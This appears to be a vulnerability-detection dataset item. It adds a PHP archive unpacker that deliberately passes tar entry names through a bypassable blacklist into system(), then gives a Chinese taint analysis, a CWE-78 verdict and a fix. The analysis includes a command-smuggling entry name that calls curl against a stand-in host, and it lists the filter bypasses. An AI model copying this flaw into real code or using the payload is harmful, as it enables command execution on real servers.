@@ -1,0 +1,42 @@
+LANG: php
+```php
+<?php
+// archive_unpacker.php — 归档解包模块，被上层批处理服务调用，
+// 处理外部提交的归档文件（tar 格式），解析归档内条目并执行清理钩子。
+
+function unpackArchive(string $archivePath, string $destDir): array
+{
+    $phar = new PharData($archivePath);
+    $extracted = [];
+
+    foreach (new RecursiveIteratorIterator($phar) as $file) {
+        $entryName = $file->getPathname();          // 第 12 行：条目名来自被解析的归档内容
+        $target = rtrim($destDir, '/') . '/' . basename($entryName);
+
+        // 弱防御：仅黑名单过滤分号与空格，认为可阻止命令注入
+        $clean = str_replace([';', ' '], '', $entryName);   // 第 16 行：可绕过的字符串替换
+
+        if (preg_match('/\.sh$/', $entryName)) {
+            // 解包后对脚本条目执行权限修复钩子
+            exec("chmod +x " . escapeshellarg($target));    // 第 20 行：此处已转义
+            // 同时调用外部病毒扫描器扫描原始条目名
+            system("clamscan --no-summary " . $clean);      // 第 22 行：SINK
+        }
+
+        $phar->extractTo($destDir, $entryName, true);
+        $extracted[] = $target;
+    }
+    return $extracted;
+}
+```
+
+1. 污点边界：本文件没有任何 request/argv/stdin 等显式 web 入口；污点源是被解析的 tar 归档文件内容——第 12 行 `$file->getPathname()` 返回的条目名完全由归档制作者（外部提交方）控制，公开接口接收的归档必须按不可信数据处理，属等效污点源。
+2. 数据流：第 9 行 `new PharData($archivePath)` 解析归档 → 第 12 行取得攻击者可控的条目名 → 第 16 行经弱过滤 → 第 22 行拼入 `system()` 执行的命令行，source→sink 可达。
+3. 防御分析：第 16 行仅做 `str_replace([';', ' '], '', ...)` 黑名单替换。绕过方式：反引号 `` `id` ``、`$(whoami)`、换行符 `%0a`、管道符 `|` 均未被过滤；例如条目名为 `x$(curl evil.sh).sh` 即可注入任意命令。第 20 行虽用了 `escapeshellarg` 但只保护 `$target`，不覆盖主 sink。
+4. 覆盖面：该过滤仅作用于进入 `system()` 的变量，未覆盖第 20 行路径拼接之外的其他潜在执行点，且黑名单策略本身不构成有效防御（CWE-78 标准判定：字符级黑名单可绕过）。
+5. 第二入口检查：全文无其他函数、无路由、无间接回调入口；唯一外部数据通道是归档文件内容，结论成立且单一。
+6. 结论：存在 CWE-78 OS 命令注入漏洞，风险等级 High（需上传含恶意条目名的归档即可触发）。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "High", "source": "line 12: PharData 归档条目名 getPathname() 外部可控", "sink": "line 22: system('clamscan --no-summary ' . $clean)", "explanation": "污点边界：无显式 web 入口，被解析的归档文件内容承载外部可控数据，为等效污点源; 主链：line 12 条目名 -> line 16 str_replace 黑名单过滤 -> line 22 system() 命令拼接执行; line 16 仅过滤分号与空格，可用反引号、$( )、管道符 | 或换行符绕过，属可绕过弱防御; line 20 使用 escapeshellarg 不受影响但非主 sink; 全文无第二入口或替代通道，唯一 source 为归档内容", "fix_suggestion": "line 22: 对 $clean 使用 escapeshellarg() 并改用白名单校验条目名字符集（如 preg_match('/^[A-Za-z0-9._-]+$/')）后再参与命令拼接"}
+```
